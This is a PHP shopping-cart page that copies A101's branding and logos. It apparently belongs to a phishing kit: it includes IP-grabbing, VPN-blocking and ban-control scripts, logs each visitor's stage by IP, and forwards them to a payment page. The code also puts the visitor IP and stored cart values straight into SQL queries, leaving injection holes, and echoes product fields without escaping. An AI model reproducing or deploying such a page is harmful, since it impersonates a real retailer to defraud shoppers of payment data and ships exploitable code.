<?php 

include_once("config.php");
include_once("./monke/Data/Server/GrabIP.php");
include_once("./monke/Data/Server/BlockVPN.php");
include_once("./monke/Data/Server/BanControl.php");
$pdo->query("UPDATE logs SET durum = 'Sepet Ekranı' WHERE ip = '{$ip}'");

$sepetbosgorunum = "none";
$sepetgorunum = "block";

$sorgu_checkBasket = $pdo->prepare("SELECT * FROM sepet WHERE ip_adresi = ?");
$sorgu_checkBasket->execute([$ip]);
$checkBasket = $sorgu_checkBasket->fetch(PDO::FETCH_ASSOC);

if ($checkBasket) {
   $urunlerArray = json_decode($checkBasket["urunler"], true);
   $sepetSayisi = is_array($urunlerArray) ? count($urunlerArray) : 0;

   if (!empty($urunlerArray)) {
      $sorgu_urunler = $pdo->prepare("SELECT id, urun_adi, urun_fiyati, urun_resmi FROM urunler WHERE id IN (" . implode(",", $urunlerArray) . ")");
      $sorgu_urunler->execute();
      $urunler = $sorgu_urunler->fetchAll(PDO::FETCH_ASSOC);
      foreach ($urunler as $urun) {
         $toplamFiyat2 += $urun['urun_fiyati'];
      }
      $toplamFiyat = number_format($toplamFiyat2, 2, ',', '.');
   }

   if ($sepetSayisi == 0 || $sepetSayisi == "0") {
      $sepetbosgorunum = "block";
      $sepetgorunum = "none";
   }
} else {
   $sepetSayisi = 0;
   $sepetbosgorunum = "block";
   $sepetgorunum = "none";
}

if ($sepetSayisi == 0) {
   header('Location: /');
}
?>
<!DOCTYPE html>
<html class="bg-zinc-900" lang="tr">

<head>
   <meta charSet="utf-8" />
   <meta name="viewport" content="width=device-width" />
   <title><?= $urunbilgi['urun_adi']; ?></title>
   <meta name="next-head-count" content="16" />
   <link rel="preload" href="./assets/css/47Kb1JsK8kaH.css" as="style" />
   <link rel="stylesheet" href="./assets/css/47Kb1JsK8kaH.css" data-n-g="" />
   <link rel="preload" href="./assets/css/J2kGLr82eY3z.css" as="style" />
   <link rel="stylesheet" href="./assets/css/J2kGLr82eY3z.css" data-n-p="" />
   <noscript data-n-css=""></noscript>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
   <div id="__next" data-reactroot="">
      <meta property="og:site_name" content="A101" />
      <meta property="twitter:site" content="@a101iletisim" />
      <meta property="twitter:card" content="summary_large_image" />
      <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KDJGN2FG" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
      <div class="flex flex-col min-h-screen">
         <div class="sticky top-0 z-10 bg-white tablet:bg-brand-gray-background mobile:bg-brand-gray-background">
            <div class="bg-gradient-to-r from-[#71E6F5] to-brand-blue-primary pt-[10px] pb-[6px] overflow-x-scroll no-scrollbar overflow-y-hidden">
               <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                  <div class="flex items-center">
                     <div>
                        <div class="flex items-center gap-x-[6px] mobile:pr-4">
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-brand-blue-secondary flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="/">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Kurumsal" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/a101-logo-2_256x256.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                           </div>
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-white flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="/">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Ekstra" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/extra-logo_512x512.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                              <div class="absolute -left-4 tablet:-bottom-[7px] mobile:-bottom-[7px]"></div>
                           </div>
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-brand-blue-secondary flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="javascript:void(0);">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Kapıda" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/kapida-logo_512x512.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                           </div>
                        </div>
                     </div>
                     <div class="flex-1"></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:hidden laptop:block">
                        <a class="bg-brand-gray-background flex items-center rounded-full  cursor-pointer tablet:border tablet:border-white/50 tablet:h-12 tablet:w-12 tablet:justify-center laptop:w-auto laptop:px-4 desktop-px-6 p-2" title="Kampanyalar" href="/kampanyalar">
                           <div>
                              <svg width="17" height="18" viewBox="0 0 17 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M0.249268 7.20081V15.3183C0.249268 16.5213 1.22809 17.5002 2.43086 17.5002H13.8853C15.0884 17.5002 16.0672 16.5213 16.0672 15.3183V7.20081C16.0672 5.99775 15.0884 5.01892 13.8853 5.01892L11.6758 5.01906C11.9356 4.86076 12.1473 4.69535 12.2778 4.52635C13.0521 3.52573 12.8689 2.08692 11.8683 1.31265C11.4511 0.989786 10.9574 0.833496 10.4678 0.833496C9.78305 0.833496 9.10601 1.13899 8.65444 1.72223C8.42397 2.02004 8.26651 2.55616 8.15805 3.16145C8.04972 2.55602 7.89213 2.01976 7.66166 1.72223C7.21038 1.139 6.53334 0.833496 5.84861 0.833496C5.35904 0.833496 4.86538 0.989804 4.44825 1.31294C3.44763 2.08721 3.26443 3.52602 4.0387 4.52664C4.16938 4.69548 4.38121 4.86075 4.64074 5.01935L2.43079 5.01921C1.22802 5.01907 0.249268 5.99778 0.249268 7.20081ZM1.34016 15.3183V9.92821H7.61275V16.4094H2.4309C1.82959 16.4094 1.34016 15.92 1.34016 15.3183ZM14.9765 15.3183C14.9765 15.9197 14.487 16.4092 13.8856 16.4092H8.70371V9.92836H14.9763L14.9765 15.3183ZM13.8857 6.11006C14.4872 6.11006 14.9766 6.5995 14.9766 7.20095V8.83732L8.70401 8.83718V6.11007L13.8857 6.11006ZM9.51727 2.38995C9.74618 2.09399 10.0928 1.92432 10.4679 1.92432C10.7351 1.92432 10.9884 2.01101 11.2006 2.17529C11.4542 2.37145 11.6159 2.65473 11.6566 2.97248C11.6972 3.29051 11.6115 3.6051 11.4153 3.85838C11.2036 4.12373 10.2149 4.56731 9.05346 4.94898C9.13161 3.72999 9.31326 2.662 9.51727 2.38995ZM4.66013 2.9726C4.7007 2.65458 4.86256 2.37158 5.1161 2.17541C5.32836 2.01113 5.58174 1.92444 5.84894 1.92444C6.2239 1.92444 6.57041 2.09427 6.79916 2.38981C7.00287 2.66129 7.18422 3.72983 7.26268 4.94965C6.10204 4.56842 5.11366 4.12469 4.90171 3.85876C4.70512 3.60523 4.61941 3.29061 4.66013 2.9726ZM7.61275 6.10999V8.8374L1.34016 8.83725V7.20074C1.34016 6.59928 1.82959 6.10985 2.43105 6.10985L7.61275 6.10999Z" fill="#00BAD3"></path>
                              </svg>
                           </div>
                           <div class="ml-2 font-medium text-brand-blue-primary text-sm hidden laptop:block">Kampanyalar</div>
                        </a>
                     </div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:hidden laptop:block">
                        <div>
                           <div class="bg-brand-gray-background flex items-center rounded-full  cursor-pointer  tablet:border tablet:border-white/50 tablet:h-12 tablet:w-12 tablet:justify-center laptop:w-auto mobile:p-2 laptop:px-4">
                              <div>
                                 <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <circle cx="10.0001" cy="6.24984" r="3.90833" stroke="#00BAD3" stroke-width="1.35"></circle>
                                    <path d="M1.925 16.2779C1.925 14.1961 3.61264 12.5085 5.69445 12.5085H14.3056C16.3874 12.5085 18.075 14.1961 18.075 16.2779C18.075 17.1324 17.3823 17.8252 16.5278 17.8252H3.47222C2.61771 17.8252 1.925 17.1324 1.925 16.2779Z" stroke="#00BAD3" stroke-width="1.35"></path>
                                 </svg>
                              </div>
                              <div class="ml-2 text-brand-blue-primary text-sm hidden font-medium laptop:block">Giriş Yap</div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>

            <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
               <div id="search-bar-section" class="hidden laptop:block">
                  <div class="flex items-center justify-between gap-2 w-full">
                     <div class="my-[10px] w-full">
                        <div class="relative flex-1">
                           <form><input id="onlineSearchBar" class="text-center outline-none caret-brand-blue-primary ring-0 pl-4 pr-10 focus:!ring-brand-gray-border focus:ring-0 focus:border-brand-gray-border w-full bg-white items-center h-10 tablet:h-12 rounded-full focus:placeholder:text-white cursor-pointer border border-brand-gray-border placeholder:text-brand-gray-secondary placeholder:text-base" placeholder="Aramak istediğin ürünü yaz..." value="" autocomplete="off"></form>
                           <div class="absolute mobile:left-3 laptop:left-4 top-1/2 -translate-y-1/2">
                              <div>
                                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M10.875 18.75C15.2242 18.75 18.75 15.2242 18.75 10.875C18.75 6.52576 15.2242 3 10.875 3C6.52576 3 3 6.52576 3 10.875C3 15.2242 6.52576 18.75 10.875 18.75Z" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M16.4434 16.4434L20.9997 20.9997" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                           <div class="absolute right-5 top-1/2 -translate-y-1/2"></div>
                        </div>
                     </div>
                     <?php if ($sepetSayisi > 0): ?>
                        <div class="w-full max-w-[160px]" onclick="window.location.href='sepet'">
                           <div>
                              <div>
                                 <div>
                                    <div class="w-full">
                                       <div class="w-full flex items-center rounded-3xl px-1 bg-brand-blue-primary h-12 cursor-pointer">
                                          <div class="p-2 bg-white rounded-full flex justify-center items-center h-10 w-10">
                                             <div class="relative"><svg width="22" height="20" viewBox="0 0 22 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                   <path d="M15.0292 15.3145C13.8912 15.3145 12.9685 16.2369 12.9685 17.3749C12.9685 18.5132 13.8909 19.4357 15.0289 19.4357C16.1672 19.4357 17.0896 18.5132 17.0896 17.3752C17.0886 16.2374 16.1667 15.3156 15.0292 15.3145ZM15.0292 18.5131C14.4005 18.5131 13.8912 18.0036 13.8912 17.3752C13.8912 16.7466 14.4005 16.2371 15.0289 16.2371C15.6576 16.2369 16.167 16.7466 16.167 17.3749C16.1662 18.0031 15.6573 18.512 15.0292 18.5131Z" fill="#333333"></path>
                                                   <path d="M20.5384 3.9065H4.16788L3.87995 2.73513C3.63127 1.71329 2.71392 0.99569 1.66249 1.00002H1.46127C1.20653 1.00002 1 1.20655 1 1.46144C1 1.71618 1.20653 1.92271 1.46127 1.92271H1.66249C2.28815 1.91766 2.8353 2.34371 2.98396 2.95162L5.22393 12.0993C5.47391 13.1191 6.39198 13.8335 7.44182 13.8254H17.0235C18.088 13.834 19.0145 13.0995 19.2491 12.0613L20.9883 4.45971C21.0198 4.32462 20.987 4.1826 20.8994 4.07478C20.8112 3.96639 20.6783 3.90433 20.5384 3.9065ZM18.3498 11.8585C18.2093 12.4758 17.6566 12.911 17.0235 12.9028H7.44182C6.81702 12.9095 6.26959 12.4854 6.12035 11.8786L4.39361 4.82919H19.9595L18.3498 11.8585Z" fill="#333333"></path>
                                                   <path d="M8.78862 15.3145C7.65059 15.3145 6.72791 16.2369 6.72791 17.3749C6.72791 18.5132 7.65045 19.4357 8.78848 19.4357C9.92665 19.4357 10.8492 18.5132 10.8492 17.3752C10.8482 16.2374 9.92622 15.3156 8.78862 15.3145ZM8.78862 18.5131C8.16007 18.5131 7.65059 18.0036 7.65059 17.3752C7.65059 16.7466 8.16007 16.2371 8.78848 16.2371C9.41703 16.2369 9.9265 16.7466 9.9265 17.3749C9.92578 18.0031 9.41674 18.512 8.78862 18.5131Z" fill="#333333"></path>
                                                   <path d="M15.0292 15.3145C13.8912 15.3145 12.9685 16.2369 12.9685 17.3749C12.9685 18.5132 13.8909 19.4357 15.0289 19.4357C16.1672 19.4357 17.0896 18.5132 17.0896 17.3752C17.0886 16.2374 16.1667 15.3156 15.0292 15.3145ZM15.0292 18.5131C14.4005 18.5131 13.8912 18.0036 13.8912 17.3752C13.8912 16.7466 14.4005 16.2371 15.0289 16.2371C15.6576 16.2369 16.167 16.7466 16.167 17.3749C16.1662 18.0031 15.6573 18.512 15.0292 18.5131Z" stroke="#333333" stroke-width="0.4"></path>
                                                   <path d="M20.5384 3.9065H4.16788L3.87995 2.73513C3.63127 1.71329 2.71392 0.99569 1.66249 1.00002H1.46127C1.20653 1.00002 1 1.20655 1 1.46144C1 1.71618 1.20653 1.92271 1.46127 1.92271H1.66249C2.28815 1.91766 2.8353 2.34371 2.98396 2.95162L5.22393 12.0993C5.47391 13.1191 6.39198 13.8335 7.44182 13.8254H17.0235C18.088 13.834 19.0145 13.0995 19.2491 12.0613L20.9883 4.45971C21.0198 4.32462 20.987 4.1826 20.8994 4.07478C20.8112 3.96639 20.6783 3.90433 20.5384 3.9065ZM18.3498 11.8585C18.2093 12.4758 17.6566 12.911 17.0235 12.9028H7.44182C6.81702 12.9095 6.26959 12.4854 6.12035 11.8786L4.39361 4.82919H19.9595L18.3498 11.8585Z" stroke="#333333" stroke-width="0.4"></path>
                                                   <path d="M8.78862 15.3145C7.65059 15.3145 6.72791 16.2369 6.72791 17.3749C6.72791 18.5132 7.65045 19.4357 8.78848 19.4357C9.92665 19.4357 10.8492 18.5132 10.8492 17.3752C10.8482 16.2374 9.92622 15.3156 8.78862 15.3145ZM8.78862 18.5131C8.16007 18.5131 7.65059 18.0036 7.65059 17.3752C7.65059 16.7466 8.16007 16.2371 8.78848 16.2371C9.41703 16.2369 9.9265 16.7466 9.9265 17.3749C9.92578 18.0031 9.41674 18.512 8.78862 18.5131Z" stroke="#333333" stroke-width="0.4"></path>
                                                </svg>
                                                <div class="absolute bg-brand-blue-primary text-white rounded-full p-1 w-auto h-[14px] text-[10px]  -top-1 -right-1 flex justify-center items-center"><?php echo $sepetSayisi; ?></div>
                                             </div>
                                          </div>
                                          <div class="flex w-full justify-center">
                                             <div class="text-white text-base font-medium">₺<?php echo $toplamFiyat; ?></div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     <?php endif; ?>
                  </div>
               </div>
            </div>
            <div class="mobile:block laptop:hidden ">
               <div class="w-full border-b">
                  <div class="my-[10px] w-full flex items-center">
                     <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                        <div class="relative flex-1">
                           <form><input id="onlineSearchBar" class="text-center outline-none caret-brand-blue-primary ring-0 pl-4 pr-10 focus:!ring-brand-gray-border focus:ring-0 focus:border-brand-gray-border w-full bg-white items-center h-10 tablet:h-12 rounded-full focus:placeholder:text-white cursor-pointer border border-brand-gray-border placeholder:text-brand-gray-secondary placeholder:text-base !pr-1 mobile:placeholder:!text-[15px]" placeholder="Aramak istediğin ürünü yaz..." value="" autocomplete="off"></form>
                           <div class="absolute mobile:left-3 laptop:left-4 top-1/2 -translate-y-1/2">
                              <div>
                                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M10.875 18.75C15.2242 18.75 18.75 15.2242 18.75 10.875C18.75 6.52576 15.2242 3 10.875 3C6.52576 3 3 6.52576 3 10.875C3 15.2242 6.52576 18.75 10.875 18.75Z" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M16.4434 16.4434L20.9997 20.9997" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                           <div class="absolute right-5 top-1/2 -translate-y-1/2"></div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="flex-1 bg-brand-gray-background pt-6">
            <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
               <div class="laptop:flex-row laptop:flex desktop:px-[22px]">
                  <div class="flex-col">
                     <div class="desktop:w-[660px] laptop:w-[644px] tablet:w-full ">
                        <div>
                           <div class="">
                              <div id="pc-cart-page-tab-container"></div>
                              <div class="flex items-center gap-2">
                                 <div class="font-medium text-md">Sepetim</div>
                                 <div class="text-xs text-brand-gray-secondary mt-[2px]"><?php echo $sepetSayisi; ?> ürün eklendi</div>
                              </div>




                              <?php
                              foreach ($urunler as $urun) {
                                 echo '<div class="space-y-2 mt-4">
        <div class="flex items-center tablet:py-3 tablet:px-4 mobile:py-4 mobile:px-4 border-0 rounded-3xl bg-white cursor-pointer">
            <div class="flex justify-between w-full items-center gap-4 relative ">
                <div class="flex">
                    <div class="border border-brand-gray-border rounded-2xl overflow-hidden flex-none max-h-20">
                    <div class="relative w-20 aspect-square">
                        <div class="select-none relative w-full h-full">
                            <div class="transition-opacity duration-300 opacity-100 "><img loading="lazy" draggable="false" alt="' . $urun['urun_adi'] . '" title="' . $urun['urun_adi'] . '" src="' . $urun['urun_resmi'] . '" class="scale-x-100" style="width: 100%; object-fit: cover;"></div>
                        </div>
                    </div>
                    </div>
                    <div class="pl-4 flex flex-col justify-center">
                    <div class="line-clamp-2 text-sm font-medium">' . $urun['urun_adi'] . '</div>
                    <div class="text-xs pt-0.5 pb-1"></div>
                    <div class="flex items-center gap-2">
                        <div class="text-lg text-[#333] font-medium">₺' . number_format((float) str_replace(',', '.', str_replace('TL', '', $urun['urun_fiyati'])), 2, ',', '.') . '</div>
                    </div>
                    <div class="tablet:hidden mobile:block laptop:w-[150px] mobile:w-[104px] mt-2">
                        <div class="rounded-full flex items-center border border-brand-gray-border select-none bg-white">
                            <div class="cursor-pointer w-7 h-7 rounded-full m-1 bg-brand-blue-primary flex items-center justify-center shadow-md shadow-brand-blue-primary/50" onclick="SepetSil(' . $urun['id'] . ')">
                                <svg width="14" height="17" viewBox="0 0 14 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12.0885 2.68598H9.42384V2.2015C9.42384 1.40007 8.77181 0.748047 7.97038 0.748047H6.03245C5.23102 0.748047 4.579 1.40007 4.579 2.2015V2.68598H1.91433C1.24647 2.68598 0.703125 3.22933 0.703125 3.89719V5.59289C0.703125 5.86044 0.920053 6.07737 1.18761 6.07737H1.45238L1.87094 14.8672C1.90792 15.6435 2.54562 16.2515 3.32273 16.2515H10.6801C11.4572 16.2515 12.0949 15.6435 12.1319 14.8672L12.5505 6.07737H12.8152C13.0828 6.07737 13.2997 5.86044 13.2997 5.59289V3.89719C13.2997 3.22933 12.7564 2.68598 12.0885 2.68598ZM5.54796 2.2015C5.54796 1.93437 5.76532 1.71701 6.03245 1.71701H7.97038C8.23752 1.71701 8.45487 1.93437 8.45487 2.2015V2.68598H5.54796V2.2015ZM1.67209 3.89719C1.67209 3.76363 1.78077 3.65495 1.91433 3.65495H12.0885C12.2221 3.65495 12.3307 3.76363 12.3307 3.89719V5.1084C12.1814 5.1084 2.29081 5.1084 1.67209 5.1084V3.89719ZM11.164 14.8211C11.1517 15.0799 10.9391 15.2826 10.6801 15.2826H3.32273C3.06368 15.2826 2.85111 15.0799 2.83882 14.8211L2.42244 6.07737H11.5804L11.164 14.8211Z" fill="white"></path>
                                <path d="M8.56254 14.3136C8.8301 14.3136 9.04702 14.0967 9.04702 13.8291V7.53082C9.04702 7.26327 8.8301 7.04634 8.56254 7.04634C8.29498 7.04634 8.07806 7.26327 8.07806 7.53082V13.8291C8.07806 14.0967 8.29495 14.3136 8.56254 14.3136Z" fill="white"></path>
                                <path d="M5.44029 14.3136C5.70785 14.3136 5.92478 14.0967 5.92478 13.8291V7.53082C5.92478 7.26327 5.70785 7.04634 5.44029 7.04634C5.17274 7.04634 4.95581 7.26327 4.95581 7.53082V13.8291C4.95581 14.0967 5.17271 14.3136 5.44029 14.3136Z" fill="white"></path>
                                </svg>
                            </div>
                            <div class="flex-1 flex items-center justify-center text-center h-4">
                                <div>1</div>
                            </div>
                            <div class="cursor-pointer w-7 h-7 rounded-full m-1 bg-brand-blue-primary flex items-center justify-center shadow-md shadow-brand-blue-primary/50 opacity-50 pointer-events-none cursor-not-allowed">
                                <svg width="14" height="13" viewBox="0 0 18 19" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.95295 0.529236C9.47925 0.529236 9.9059 0.955882 9.9059 1.48218V8.47041H16.8941C17.4204 8.47041 17.8471 8.89706 17.8471 9.42335C17.8471 9.94965 17.4204 10.3763 16.8941 10.3763H9.9059V17.3645C9.9059 17.8908 9.47925 18.3175 8.95296 18.3175C8.42666 18.3175 8.00001 17.8908 8.00001 17.3645V10.3763H1.01178C0.485484 10.3763 0.0588379 9.94965 0.0588379 9.42335C0.0588379 8.89706 0.485484 8.47041 1.01178 8.47041H8.00001V1.48218C8.00001 0.955882 8.42666 0.529236 8.95295 0.529236Z" fill="white"></path>
                                </svg>
                            </div>
                        </div>
                    </div>
                    </div>
                </div>
            </div>
            <div class="tablet:!block mobile:hidden w-full max-w-[130px]">
                <div class="rounded-full flex items-center border border-brand-gray-border select-none bg-white">
                <div class="cursor-pointer w-7 h-7 rounded-full m-1 bg-brand-blue-primary flex items-center justify-center shadow-md shadow-brand-blue-primary/50" onclick="SepetSil(' . $urun['id'] . ')">
                <svg width="14" height="17" viewBox="0 0 14 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12.0885 2.68598H9.42384V2.2015C9.42384 1.40007 8.77181 0.748047 7.97038 0.748047H6.03245C5.23102 0.748047 4.579 1.40007 4.579 2.2015V2.68598H1.91433C1.24647 2.68598 0.703125 3.22933 0.703125 3.89719V5.59289C0.703125 5.86044 0.920053 6.07737 1.18761 6.07737H1.45238L1.87094 14.8672C1.90792 15.6435 2.54562 16.2515 3.32273 16.2515H10.6801C11.4572 16.2515 12.0949 15.6435 12.1319 14.8672L12.5505 6.07737H12.8152C13.0828 6.07737 13.2997 5.86044 13.2997 5.59289V3.89719C13.2997 3.22933 12.7564 2.68598 12.0885 2.68598ZM5.54796 2.2015C5.54796 1.93437 5.76532 1.71701 6.03245 1.71701H7.97038C8.23752 1.71701 8.45487 1.93437 8.45487 2.2015V2.68598H5.54796V2.2015ZM1.67209 3.89719C1.67209 3.76363 1.78077 3.65495 1.91433 3.65495H12.0885C12.2221 3.65495 12.3307 3.76363 12.3307 3.89719V5.1084C12.1814 5.1084 2.29081 5.1084 1.67209 5.1084V3.89719ZM11.164 14.8211C11.1517 15.0799 10.9391 15.2826 10.6801 15.2826H3.32273C3.06368 15.2826 2.85111 15.0799 2.83882 14.8211L2.42244 6.07737H11.5804L11.164 14.8211Z" fill="white"></path>
                <path d="M8.56254 14.3136C8.8301 14.3136 9.04702 14.0967 9.04702 13.8291V7.53082C9.04702 7.26327 8.8301 7.04634 8.56254 7.04634C8.29498 7.04634 8.07806 7.26327 8.07806 7.53082V13.8291C8.07806 14.0967 8.29495 14.3136 8.56254 14.3136Z" fill="white"></path>
                <path d="M5.44029 14.3136C5.70785 14.3136 5.92478 14.0967 5.92478 13.8291V7.53082C5.92478 7.26327 5.70785 7.04634 5.44029 7.04634C5.17274 7.04634 4.95581 7.26327 4.95581 7.53082V13.8291C4.95581 14.0967 5.17271 14.3136 5.44029 14.3136Z" fill="white"></path>
                </svg>
            </div>
                    <div class="flex-1 flex items-center justify-center text-center h-4">
                    <div>1</div>
                    </div>
                    <div class="cursor-pointer w-7 h-7 rounded-full m-1 bg-brand-blue-primary flex items-center justify-center shadow-md shadow-brand-blue-primary/50 opacity-50 pointer-events-none cursor-not-allowed">
                    <svg width="14" height="13" viewBox="0 0 18 19" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.95295 0.529236C9.47925 0.529236 9.9059 0.955882 9.9059 1.48218V8.47041H16.8941C17.4204 8.47041 17.8471 8.89706 17.8471 9.42335C17.8471 9.94965 17.4204 10.3763 16.8941 10.3763H9.9059V17.3645C9.9059 17.8908 9.47925 18.3175 8.95296 18.3175C8.42666 18.3175 8.00001 17.8908 8.00001 17.3645V10.3763H1.01178C0.485484 10.3763 0.0588379 9.94965 0.0588379 9.42335C0.0588379 8.89706 0.485484 8.47041 1.01178 8.47041H8.00001V1.48218C8.00001 0.955882 8.42666 0.529236 8.95295 0.529236Z" fill="white"></path>
                    </svg>
                    </div>
                </div>
            </div>
        </div>
    </div>';
                              }

                              ?>











                              <div class="personaclick-recommend personaclick-recommend-rendered" data-recommender-block="dynamic" data-recommender-code="44959f5378c2ef2e7ec51225ff5c8094"></div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="desktop:ml-10 laptop:ml-4 laptop:pt-0 mobile:pt-8 desktop:w-[460px] laptop:w-[314px]">
                     <div>
                        <div class="font-medium text-md mb-4">Sepet Özeti</div>
                        <div class="flex items-center mt-2">
                           <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                              <path d="M14.125 7.75L8.62497 13L5.875 10.375" stroke="#4CAF50" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                              <path d="M10 19C14.9706 19 19 14.9706 19 10C19 5.02944 14.9706 1 10 1C5.02944 1 1 5.02944 1 10C1 14.9706 5.02944 19 10 19Z" stroke="#4CAF50" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                           </svg>
                           <div class="text-brand-status-success ml-2 text-xs font-medium">Ücretsiz Teslimat</div>
                        </div>
                        <div class="bg-white rounded-3xl py-4 mt-4 text-sm space-y-4">
                           <div class="flex items-center justify-between px-4 ">
                              <div>Sepet Tutarı</div>
                              <div> ₺<?php echo $toplamFiyat; ?></div>
                           </div>
                           <div class="flex items-center justify-between px-4 ">
                              <div class="flex items-center"><span class="pr-1">Kargo Ücreti</span></div>
                              <div> ₺0,00</div>
                           </div>
                           <div class="ml-4 text-brand-gray-secondary space-y-4 px-4"></div>
                           <div class="flex items-center justify-between px-4 border-t border-t-brand-gray-border/50 pt-4 font-medium">
                              <div>Toplam</div>
                              <div class="text-base text-[#333]"> ₺<?php echo $toplamFiyat; ?></div>
                           </div>
                        </div>
                        <div class="space-y-2 mt-4 mb-7 w-full"></div>
                        <div class="mb-4"></div>
                        <div class="mobile:pb-8"><button class="bg-brand-blue-primary  rounded-full text-base  px-5 py-3 text-center w-full text-white " onclick="window.location.href='odeme'">Devam Et</button></div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="h-[calc(64px+env(safe-area-inset-bottom))] bg-white" id="m1" style="display: none;"></div>
         <div class="fixed bottom-0 bg-white w-full  z-[3]" id="m2" style="display: none;">
            <div class="ios-padding border-t w-full flex justify-around pt-2">
               <div class="flex flex-col items-center relative" onclick="window.location.href='/'">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.35508 21.3C4.47061 21.3 3.7 20.5395 3.7 19.5434V10.2754C3.7 9.88426 3.87608 9.51394 4.17943 9.26707L11.1794 3.57032C11.6573 3.18138 12.3426 3.18138 12.8206 3.57032L19.8206 9.2671C20.1239 9.51397 20.3 9.88429 20.3 10.2754V19.5434C20.3 20.5395 19.5294 21.3 18.6449 21.3H5.35508Z" stroke="#8D939C" stroke-width="1.4"></path>
